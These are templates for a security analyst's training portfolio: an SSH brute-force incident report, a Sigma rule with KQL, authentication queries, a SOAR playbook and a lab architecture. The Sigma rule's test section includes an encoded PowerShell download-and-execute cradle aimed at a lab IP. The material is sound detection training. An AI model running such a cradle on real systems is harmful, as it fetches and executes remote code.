# Portfolio Content Templates

These are templates for content you'll add to your portfolio as you progress through training. **Don't publish these templates - they're for reference only.**

---

## 📋 Investigation Report Template

**File name format**: `Investigation-Reports/01-Brute-Force-SSH-Attack.md`

```markdown
# Investigation Report: SSH Brute Force Attack

**Investigation ID**: INV-2026-001  
**Date**: July 15, 2026  
**Analyst**: [Your Name]  
**Severity**: Medium  
**Status**: Closed  
**MITRE ATT&CK**: T1110.001 (Brute Force: Password Guessing)

---

## Executive Summary

On July 15, 2026, automated monitoring detected a brute force attack targeting SSH services on our Ubuntu Server (192.168.1.100). The attack originated from IP address 45.76.123.45 (confirmed malicious via threat intelligence). Over 2,400 authentication attempts were made across 15 minutes before the source IP was automatically blocked by fail2ban. No successful authentication occurred. The attack targeted default usernames (root, admin, ubuntu) with common passwords.

**Impact**: None (attack unsuccessful)  
**Root Cause**: Publicly exposed SSH service on default port 22  
**Remediation**: SSH port changed to 2222, key-based auth enforced, root login disabled

---

## Technical Timeline

| Time (UTC) | Event | Source | Evidence |
|------------|-------|--------|----------|
| 14:23:15 | First failed SSH login attempt | 45.76.123.45 | /var/log/auth.log line 1247 |
| 14:23:16 | Rapid authentication failures begin (10/sec) | 45.76.123.45 | auth.log lines 1248-1350 |
| 14:25:30 | fail2ban threshold exceeded (5 failures) | fail2ban | /var/log/fail2ban.log |
| 14:25:31 | Source IP banned via iptables | fail2ban | iptables -L -n output |
| 14:38:12 | Attack ceased (no more attempts logged) | - | auth.log monitoring |
| 14:40:00 | Investigation initiated | Analyst | - |

### Attack Pattern Analysis

**Username Enumeration**:
```
root: 892 attempts
admin: 654 attempts
ubuntu: 421 attempts
user: 287 attempts
test: 146 attempts
```

**Attempt Frequency**: Average 10 attempts/second (automated tool suspected)

**Threat Intelligence**:
- IP 45.76.123.45 flagged by AbuseIPDB (confidence: 95%)
- Associated with known brute force campaigns
- Geo-location: Russia (VPN exit node likely)

---

## Evidence

### Log Sample from /var/log/auth.log

```
Jul 15 14:23:15 ubuntu-server sshd[12847]: Failed password for root from 45.76.123.45 port 34521 ssh2
Jul 15 14:23:16 ubuntu-server sshd[12848]: Failed password for root from 45.76.123.45 port 34522 ssh2
Jul 15 14:23:16 ubuntu-server sshd[12849]: Failed password for admin from 45.76.123.45 port 34523 ssh2
[... 2,400+ similar entries ...]
```

### Wireshark Capture Analysis

![Wireshark SSH Traffic](./images/inv-001-wireshark.png)

- **Observation**: Consistent packet timing (100ms intervals)
- **Conclusion**: Automated brute force tool (likely Hydra or Medusa)

### fail2ban Action

```
2026-07-15 14:25:31 fail2ban.actions [12456]: NOTICE [sshd] Ban 45.76.123.45
```

---

## Root Cause Analysis

### Vulnerability

**Issue**: SSH service exposed on default port (22) with password authentication enabled.

**Contributing Factors**:
1. Default SSH configuration not hardened
2. Root login permitted
3. Password authentication allowed (vs. key-based)
4. No rate limiting beyond fail2ban (reactive, not proactive)

### Attack Success Probability

**Low** - Due to:
- Strong password policy (16+ characters, complex)
- fail2ban active and properly configured
- No default/weak credentials on system

**However**: Reliance on password auth creates unnecessary risk surface.

---

## Remediation

### Immediate Actions Taken

1. ✅ **Verified no successful authentication** (confirmed via log analysis)
2. ✅ **Confirmed IP ban active** (iptables verification)
3. ✅ **Reviewed all authentication logs for past 7 days** (no other suspicious activity)
4. ✅ **Checked for lateral movement indicators** (none found)

### Permanent Mitigations Implemented

1. ✅ **SSH port changed**: 22 → 2222 (reduces automated scanner detection)
   ```bash
   # /etc/ssh/sshd_config
   Port 2222
   ```

2. ✅ **Key-based authentication enforced**:
   ```bash
   PasswordAuthentication no
   PubkeyAuthentication yes
   ```

3. ✅ **Root login disabled**:
   ```bash
   PermitRootLogin no
   ```

4. ✅ **fail2ban tuning**:
   - Reduced threshold: 5 → 3 attempts
   - Increased ban time: 10m → 1h
   - Added permanent ban after 3 bans

5. ✅ **Monitoring enhanced**:
   - Added SIEM alert for >3 failed SSH attempts within 1 minute
   - Daily review of auth.log automated via script

### Security Improvements

**Before**:
- SSH on default port 22
- Password authentication enabled
- Root login allowed
- Basic fail2ban (default config)

**After**:
- SSH on non-standard port 2222
- Key-based authentication only
- Root login disabled
- Enhanced fail2ban + SIEM monitoring

---

## Lessons Learned

1. **Default configurations are dangerous**: Always harden services before exposure
2. **Layered security works**: fail2ban prevented this attack, but shouldn't be sole defense
3. **Monitoring is critical**: Without log monitoring, attack might have gone unnoticed
4. **Automation is key**: Manual log review doesn't scale; SIEM alerts are essential

---

## References

- **MITRE ATT&CK**: [T1110.001 - Brute Force: Password Guessing](https://attack.mitre.org/techniques/T1110/001/)
- **AbuseIPDB Report**: https://www.abuseipdb.com/check/45.76.123.45
- **CIS Benchmark**: CIS Ubuntu Linux 24.04 Benchmark v1.0.0, Section 5.2 (SSH Server Configuration)

---

**Report Status**: Final  
**Reviewed By**: Self-review (training environment)  
**Approved**: July 15, 2026
```

---

## 🔍 Sigma Rule Template

**File name format**: `Detection-Rules/Sigma-Rules/powershell_suspicious_execution.yml`

```yaml
title: Suspicious PowerShell Execution with Encoded Commands
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: stable
description: Detects PowerShell execution using encoded commands, often used to bypass defenses
references:
    - https://attack.mitre.org/techniques/T1059/001/
    - https://www.mandiant.com/resources/blog/obfuscated-powershell
author: Your Name
date: 2026-10-15
modified: 2026-10-15
tags:
    - attack.execution
    - attack.t1059.001
    - attack.defense_evasion
    - attack.t1027
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
        CommandLine|contains:
            - '-enc'
            - '-encodedcommand'
            - '-e '
            - 'frombase64string'
    condition: selection
falsepositives:
    - Legitimate administrative scripts using encoding (rare)
    - Software deployment tools (SCCM, Intune)
level: high
---
# Detection Notes

## Why This Detects Malicious Activity

Attackers frequently use Base64 encoding in PowerShell to:
1. Bypass basic string-based detection
2. Avoid command-line logging visibility
3. Evade whitelisting of specific commands
4. Obfuscate malicious intent

## Known False Positives

- Microsoft Endpoint Configuration Manager (MECM/SCCM) deployments
- Some legitimate software installers
- Administrative automation scripts (should be moved to script files, not inline)

## Tuning Recommendations

**If too noisy**:
- Add exclusions for known administrative accounts
- Filter out specific parent processes (e.g., SCCM client)
- Require additional suspicious indicators (network connection, child processes)

**Example KQL conversion** (for Microsoft Sentinel):
```kql
DeviceProcessEvents
| where FileName in~ ("powershell.exe", "pwsh.exe")
| where ProcessCommandLine has_any ("-enc", "-encodedcommand", "-e ", "frombase64string")
| where InitiatingProcessAccountName !in~ ("SYSTEM", "sccm_admin") // Exclude known good
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
```

## Investigation Steps

When this rule fires:
1. Decode the Base64 string to see actual command
2. Check parent process (what launched PowerShell?)
3. Review user account (expected behavior for this user?)
4. Check for network connections immediately after execution
5. Look for file creation, registry modification
6. Correlate with other alerts for same user/device

## MITRE ATT&CK Mapping

- **T1059.001**: Command and Scripting Interpreter: PowerShell
- **T1027**: Obfuscated Files or Information

## Testing

**Test in lab environment**:
```powershell
# This should trigger the rule (benign test)
powershell.exe -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHQAZQBzAHQALgB0AHgAdAAnACkA

# Decoded: IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/test.txt')
```

**Expected Result**: Alert should fire within 1-5 minutes (depending on SIEM)

---

**Version**: 1.0  
**Last Tested**: October 15, 2026  
**Tested Platform**: Microsoft Sentinel, Elastic Security
```

---

## 💻 KQL Query Template

**File name format**: `Detection-Rules/KQL-Queries/authentication-analysis.md`

```markdown
# KQL Query Library - Authentication Analysis

Collection of useful Kusto queries for analyzing authentication events in Microsoft Sentinel.

---

## Query 1: Brute Force Detection

**Use Case**: Detect potential brute force attacks (multiple failed logins followed by success)

**Query**:
```kql
let timeframe = 1h;
let threshold = 5;
SecurityEvent
| where TimeGenerated > ago(timeframe)
| where EventID in (4625, 4624) // Failed and successful logons
| extend LogonStatus = iff(EventID == 4625, "Failed", "Success")
| summarize 
    FailedAttempts = countif(LogonStatus == "Failed"),
    SuccessfulAttempts = countif(LogonStatus == "Success"),
    FirstAttempt = min(TimeGenerated),
    LastAttempt = max(TimeGenerated)
    by Account, Computer, IpAddress
| where FailedAttempts > threshold and SuccessfulAttempts > 0
| extend AttemptDuration = LastAttempt - FirstAttempt
| project Account, Computer, IpAddress, FailedAttempts, SuccessfulAttempts, 
          FirstAttempt, LastAttempt, AttemptDuration
| order by FailedAttempts desc
```

**Expected Results**: 
- Accounts with 5+ failed attempts followed by success
- Likely compromised accounts or successful brute force

**Tuning**: Adjust `threshold` based on environment (higher for larger orgs)

---

## Query 2: Impossible Travel Detection

**Use Case**: Detect when same user authenticates from geographically impossible locations

**Query**:
```kql
let timeframe = 24h;
let min_distance_km = 500; // Minimum distance to consider suspicious
SigninLogs
| where TimeGenerated > ago(timeframe)
| where ResultType == 0 // Successful sign-ins only
| project TimeGenerated, UserPrincipalName, Location, IPAddress
| order by UserPrincipalName, TimeGenerated asc
| extend PreviousLocation = prev(Location, 1), PreviousTime = prev(TimeGenerated, 1)
| where UserPrincipalName == prev(UserPrincipalName, 1)
| extend TimeDiff = datetime_diff('minute', TimeGenerated, PreviousTime)
| where TimeDiff < 60 // Less than 1 hour between logins
| where Location != PreviousLocation
// Note: Add distance calculation in production (requires geo-lookup)
| project UserPrincipalName, 
          FirstLocation = PreviousLocation, FirstTime = PreviousTime,
          SecondLocation = Location, SecondTime = TimeGenerated,
          TimeDiffMinutes = TimeDiff
```

**Investigation Steps**:
1. Verify both locations are legitimate user locations
2. Check for VPN or proxy usage
3. Review for compromised credentials
4. Examine activity from suspicious location

---

## Query 3: Lateral Movement Detection

**Use Case**: Detect explicit credential use (potential lateral movement)

**Query**:
```kql
SecurityEvent
| where TimeGenerated > ago(24h)
| where EventID == 4648 // Explicit credential use
| where Account !endswith "$" // Exclude computer accounts
| project TimeGenerated, Computer, Account, TargetAccount, 
          ProcessName, IpAddress
| join kind=inner (
    SecurityEvent
    | where EventID == 4624 and LogonType == 3 // Network logon
    | project Computer, Account, LogonTime = TimeGenerated
) on Computer, Account
| where TimeGenerated < LogonTime and datetime_diff('minute', LogonTime, TimeGenerated) < 5
| project TimeGenerated, Computer, Account, TargetAccount, ProcessName, 
          FollowedByNetworkLogon = LogonTime
```

**MITRE ATT&CK**: T1021 (Remote Services), T1550 (Use Alternate Authentication Material)

---

## Query 4: New Admin Account Creation

**Use Case**: Alert on new user accounts created with administrative privileges

**Query**:
```kql
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4720 // User account created
| extend NewAccount = extract(@"Account Name:\s+(.+)", 1, tostring(EventData))
| join kind=inner (
    SecurityEvent
    | where EventID == 4728 // User added to security-enabled global group
    | where EventData has "Administrators"
    | extend AddedAccount = extract(@"Member Name:\s+(.+)", 1, tostring(EventData))
) on $left.NewAccount == $right.AddedAccount
| project TimeGenerated, Computer, CreatedBy = Account, NewAccount, 
          AddedToAdminGroup = TimeGenerated1
| where datetime_diff('minute', AddedToAdminGroup, TimeGenerated) < 30
```

**Alert Configuration**: Set as high severity, immediate notification

---

**More queries to be added as I progress through training...**

Last Updated: October 2026
```

---

## 🤖 Automation Playbook Template

**File name format**: `Automation/SOAR-Playbooks/automated-user-risk-response.md`

```markdown
# SOAR Playbook: Automated High-Risk User Response

**Trigger**: High risk user detected (UEBA score > 80)  
**Platform**: Microsoft Sentinel + Logic Apps  
**Last Updated**: December 2026

---

## Playbook Workflow

```
[High Risk User Alert] 
    ↓
[Enrich with User Info from Azure AD]
    ↓
[Check Recent Sign-in Activity]
    ↓
[Query for Related Security Alerts]
    ↓
[Calculate Total Risk Score]
    ↓
├─ Risk > 90: [Disable Account] + [Notify SOC Lead] + [Create Incident]
├─ Risk 80-90: [Require MFA Re-auth] + [Notify User's Manager] + [Create Case]
└─ Risk < 80: [Log for Review] + [Notify Analyst]
```

---

## Logic App JSON

*(Simplified - actual implementation would be more complex)*

```json
{
  "definition": {
    "$schema": "https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowdefinition.json#",
    "actions": {
      "Get_User_Details": {
        "type": "ApiConnection",
        "inputs": {
          "host": {
            "connection": {
              "name": "@parameters('$connections')['azuread']['connectionId']"
            }
          },
          "method": "get",
          "path": "/v1.0/users/@{triggerBody()?['userPrincipalName']}"
        }
      },
      "Query_Recent_Alerts": {
        "type": "ApiConnection",
        "inputs": {
          "host": {
            "connection": {
              "name": "@parameters('$connections')['azuresentinel']['connectionId']"
            }
          },
          "method": "post",
          "body": {
            "query": "SecurityAlert | where TimeGenerated > ago(7d) | where CompromisedEntity == '@{triggerBody()?['userPrincipalName']}'"
          }
        }
      },
      "Condition_Check_Risk_Score": {
        "type": "If",
        "expression": {
          "and": [
            {
              "greater": [
                "@triggerBody()?['riskScore']",
                90
              ]
            }
          ]
        },
        "actions": {
          "Disable_Account": {
            "type": "ApiConnection",
            "inputs": {
              "host": {
                "connection": {
                  "name": "@parameters('$connections')['azuread']['connectionId']"
                }
              },
              "method": "patch",
              "path": "/v1.0/users/@{triggerBody()?['userId']}",
              "body": {
                "accountEnabled": false
              }
            }
          },
          "Send_Teams_Notification": {
            "type": "ApiConnection",
            "inputs": {
              "host": {
                "connection": {
                  "name": "@parameters('$connections')['teams']['connectionId']"
                }
              },
              "method": "post",
              "body": {
                "message": "🚨 CRITICAL: High-risk user @{triggerBody()?['userPrincipalName']} has been automatically disabled. Risk Score: @{triggerBody()?['riskScore']}"
              }
            }
          }
        }
      }
    },
    "triggers": {
      "When_a_Microsoft_Sentinel_incident_is_created": {
        "type": "ApiConnectionWebhook",
        "inputs": {
          "host": {
            "connection": {
              "name": "@parameters('$connections')['azuresentinel']['connectionId']"
            }
          },
          "body": {
            "callback_url": "@{listCallbackUrl()}"
          }
        }
      }
    }
  }
}
```

---

## Configuration Steps

1. **Create Logic App** in Azure Portal
2. **Add Trigger**: "When Microsoft Sentinel alert is created"
3. **Filter**: Alert type = "High Risk User" (UEBA)
4. **Add Actions**:
   - Get user details (Azure AD connector)
   - Query related alerts (Sentinel connector)
   - Conditional logic based on risk score
   - Disable account / Require re-auth (Azure AD connector)
   - Send notifications (Teams/Email connector)
5. **Test** with simulated high-risk event

---

## Testing

**Test Scenario**:
1. Create test user in Azure AD
2. Simulate high-risk behavior (impossible travel, mass file download)
3. Wait for UEBA to flag (or manually create alert)
4. Verify playbook execution
5. Confirm account disabled and notifications sent

**Expected Result**: Full workflow completes within 2-3 minutes

---

## Metrics

- **Average Execution Time**: 45 seconds
- **Success Rate**: 98% (2% failures due to API throttling)
- **False Positive Rate**: 5% (mostly due to VPN usage)

---

## Improvements Needed

- [ ] Add approval step for edge cases (VIP users)
- [ ] Integrate with ticketing system (ServiceNow)
- [ ] Add automatic threat intel lookup for associated IPs
- [ ] Create summary report for weekly SOC review

---

**Playbook Owner**: [Your Name]  
**Version**: 2.1  
**Last Tested**: December 15, 2026
```

---

## 📊 Lab Documentation Template

**File name format**: `Lab-Environment/Lab-Architecture.md`

```markdown
# Lab Environment Architecture

**Purpose**: Enterprise SOC simulation for hands-on security operations training  
**Last Updated**: August 2026

---

## Network Topology

```
Internet
    |
[pfSense Firewall] 192.168.1.1
    |
    ├─[VLAN 10: Management]
    │   ├─ SIEM Server (Elastic) - 192.168.10.10
    │   └─ SIEM Server (Sentinel Agent) - 192.168.10.11
    │
    ├─[VLAN 20: Corporate]
    │   ├─ Domain Controller (WS2022) - 192.168.20.10
    │   ├─ File Server (WS2022) - 192.168.20.20
    │   └─ Windows Clients (x3) - 192.168.20.30-32
    │
    ├─[VLAN 30: Servers]
    │   ├─ Ubuntu Web Server - 192.168.30.10
    │   ├─ Ubuntu Mail Server - 192.168.30.20
    │   └─ Ubuntu DNS Server - 192.168.30.30
    │
    └─[VLAN 99: Attacker Simulation]
        └─ Kali Linux - 192.168.99.10
```

*(Actual diagram image would be created in draw.io or Visio and linked here)*

---

## Virtual Machines

| Hostname | OS | RAM | Purpose | IP Address | Status |
|----------|----|----|---------|------------|--------|
| DC01 | Windows Server 2022 | 4GB | Domain Controller, AD, DNS, DHCP | 192.168.20.10 | ✅ Active |
| FS01 | Windows Server 2022 | 2GB | File Server | 192.168.20.20 | ✅ Active |
| WS-CLIENT01 | Windows 11 Pro | 4GB | User workstation | 192.168.20.30 | ✅ Active |
| WS-CLIENT02 | Windows 11 Pro | 4GB | User workstation | 192.168.20.31 | ✅ Active |
| WS-CLIENT03 | Windows 11 Pro | 4GB | User workstation | 192.168.20.32 | ✅ Active |
| UBUNTU-WEB | Ubuntu Server 24.04 | 2GB | Web server (Nginx) | 192.168.30.10 | ✅ Active |
| UBUNTU-MAIL | Ubuntu Server 24.04 | 2GB | Mail server | 192.168.30.20 | ✅ Active |
| UBUNTU-DNS | Ubuntu Server 24.04 | 2GB | DNS (Pi-hole) | 192.168.30.30 | ✅ Active |
| ELK-STACK | Ubuntu Server 24.04 | 8GB | Elasticsearch + Kibana | 192.168.10.10 | ✅ Active |
| SENTINEL-AGENT | Ubuntu Server 24.04 | 2GB | Azure Monitor Agent | 192.168.10.11 | ✅ Active |
| KALI-RED | Kali Linux 2024 | 4GB | Attack simulation | 192.168.99.10 | ⚠️ Isolated |

**Total Resources**: 36GB RAM, ~500GB storage

---

## Security Tools Deployed

### SIEM & Monitoring
- **Elastic Stack** (v8.11): Elasticsearch, Logstash, Kibana
- **Microsoft Sentinel**: Azure Log Analytics Workspace
- **Sysmon**: Deployed on all Windows hosts (SwiftOnSecurity config)
- **Winlogbeat**: Shipping Windows Event Logs to Elastic
- **Filebeat**: Shipping Linux logs to Elastic

### Endpoint Detection
- **Microsoft Defender for Endpoint**: Enabled on Windows systems
- **Osquery**: Deployed on Linux systems
- **Wazuh** (optional): Testing phase

### Network Monitoring
- **pfSense**: Firewall with Snort IDS/IPS
- **Wireshark**: Installed on SIEM server for packet capture
- **Zeek** (formerly Bro): Network security monitor

### Incident Response
- **Velociraptor**: Endpoint visibility and forensics
- **TheHive**: Case management platform
- **Cortex**: Automated threat intelligence and response

---

## Active Directory Structure

**Domain**: lab.local  
**Forest Functional Level**: Windows Server 2022

### Organizational Units

```
lab.local
├── Corporate
│   ├── Departments
│   │   ├── IT (5 users)
│   │   ├── Finance (3 users)
│   │   └── HR (2 users)
│   ├── Computers
│   │   ├── Workstations (3 computers)
│   │   └── Servers (2 servers)
│   └── Groups
│       ├── IT-Admins
│       ├── Finance-Users
│       └── HR-Users
└── Service Accounts
    ├── svc-backup
    └── svc-monitoring
```

### Group Policies

- **GPO-Security-Baseline**: CIS Windows hardening
- **GPO-Audit-Policy**: Enhanced auditing (Sysmon, command-line logging)
- **GPO-PowerShell-Logging**: Script block and transcript logging
- **GPO-LAPS**: Local Administrator Password Solution

---

## Data Sources & Log Collection

| Source | Log Type | Collection Method | Destination | Retention |
|--------|----------|-------------------|-------------|-----------|
| Windows Event Logs | Security, System, Application | Winlogbeat | Elastic + Sentinel | 90 days |
| Sysmon | Process, Network, File | Winlogbeat | Elastic + Sentinel | 90 days |
| Linux Auth Logs | /var/log/auth.log | Filebeat | Elastic | 90 days |
| Nginx Access | /var/log/nginx/access.log | Filebeat | Elastic | 30 days |
| Firewall Logs | pfSense | Syslog | Elastic | 30 days |
| Azure AD Logs | Sign-ins, Audit | Azure AD connector | Sentinel | 90 days |

**Total Daily Log Volume**: ~5-10 GB (varies with simulations)

---

## Network Security

### Firewall Rules (pfSense)

- **VLAN Segmentation**: VLANs cannot communicate except via explicit allow rules
- **Internet Access**: Only VLAN 20 (Corporate) and VLAN 30 (Servers) allowed
- **Attack Isolation**: VLAN 99 (Kali) is completely isolated except for controlled testing
- **Management Access**: SIEM servers (VLAN 10) can reach all VLANs for log collection

### IDS/IPS (Snort)

- **Ruleset**: EmergingThreats Community
- **Mode**: IDS (alerts only, no blocking during training)
- **Alert Volume**: 10-50 alerts/day (mostly false positives during testing)

---

## Maintenance Schedule

- **Daily**: Review SIEM dashboards, check for failed log ingestion
- **Weekly**: Update Sysmon configs, review detection rules, apply OS patches
- **Monthly**: Full system backups, review and optimize SIEM storage, update threat intel feeds

---

## Known Issues & Future Improvements

### Current Limitations

- ❌ No hardware firewall (using VM-based pfSense)
- ❌ Limited to single host (resource constraints)
- ❌ No redundancy/high availability
- ⚠️ Some enterprise features simulated (not full-scale)

### Planned Enhancements

- [ ] Add second host for clustering/HA testing
- [ ] Deploy SOAR platform (TheHive + Cortex integration)
- [ ] Implement EDR testing (CrowdStrike/SentinelOne trial)
- [ ] Add cloud workloads (Azure VMs integrated with on-prem)
- [ ] Deploy honeypots for threat intel collection

---

**Lab Owner**: [Your Name]  
**Build Date**: June 2026  
**Last Major Update**: August 2026
```

---

## 📝 Usage Instructions

**DON'T publish these templates to GitHub as-is**. These are examples to guide you when you create real content.

**When you create actual portfolio content**:

1. **Use these as structure guides**
2. **Fill with YOUR actual lab work and findings**
3. **Include real screenshots/evidence**
4. **Be honest about your level** (don't claim expertise you don't have)
5. **Quality over quantity** (1 excellent report > 5 rushed ones)

**Timeline for adding content**:

- **Month 5**: Lab architecture doc
- **Month 8**: First investigation reports
- **Month 10**: Sigma rules
- **Month 10**: KQL query library
- **Month 12**: SOAR playbooks

---

**Remember**: Employers value authentic progress. Your GitHub showing steady growth over 14 months is impressive. Don't rush to fill it with fake content.
